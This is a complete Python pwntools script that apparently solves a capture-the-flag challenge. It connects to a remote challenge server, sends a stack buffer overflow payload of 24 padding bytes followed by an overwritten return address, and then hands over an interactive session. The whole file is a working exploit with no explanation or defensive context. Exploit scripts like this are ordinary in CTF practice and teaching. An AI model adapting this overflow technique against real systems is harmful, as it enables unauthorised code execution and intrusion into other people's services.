from pwn import *

p = remote('pwn-2021.duc.tf', 31921)

payload = b'a'*24
payload += p64(0x004011d8)

p.sendline(payload)

p.interactive()